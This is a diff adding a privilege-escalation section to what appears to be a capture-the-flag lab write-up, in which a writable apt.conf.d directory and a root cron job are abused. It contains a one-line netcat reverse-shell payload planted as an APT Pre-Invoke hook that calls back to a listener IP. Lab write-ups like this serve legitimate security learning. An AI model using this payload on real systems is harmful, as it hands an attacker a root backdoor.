@@ -69,3 +69,25 @@ Boom we are in as user `franklin` stablized the shell.
 
 ## Privilege Escalation
 
+![image](https://user-images.githubusercontent.com/87468669/211537418-c3baf6bc-92c0-4e60-ab54-637e1e53e59b.png)
+
+![image](https://user-images.githubusercontent.com/87468669/211537602-650b1e8e-4571-40c9-aa96-93a4c8e60646.png)
+
+running linpeas, i saw cronjobs running as root, and also the `/etc/apt/apt.conf.d` directory is writable, guess that's our way in. who know but let's find out.😉 
+
+## Exploiting cronjob
+
+Let’s exploit apt-get service by abusing cron job as we all know cron job run as root. Suppose we had access to the targeted system locally and want the root user rights to enhanced limited shell access.
+And we know apt.conf.d file has full permission as said above (You can also manually check to ensure the writable directory using find command) in the lab setup. Therefore, we will create a malicious file inside apt.conf.d by injecting netcat reverse backdoor:
+
+```
+echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.108 22 >/tmp/f"};' > pwn
+```
+
+![image](https://user-images.githubusercontent.com/87468669/211539062-5f79539e-ac88-4525-94f9-4e6f6b440cd5.png)
+
+Start the netcat listener to access the reverse connection of the host machine and wait for 2 minutes to obtain the privilege shell since apt-get update task is scheduled to update the packages every time, after minute through crontab that runs as root and it runs our netcat backdoor pwn to get reverse connections
+
+![image](https://user-images.githubusercontent.com/87468669/211540483-3a99a95e-a6ec-44bc-a5dc-de4951880bb4.png)
+
+and we got root!!!😎
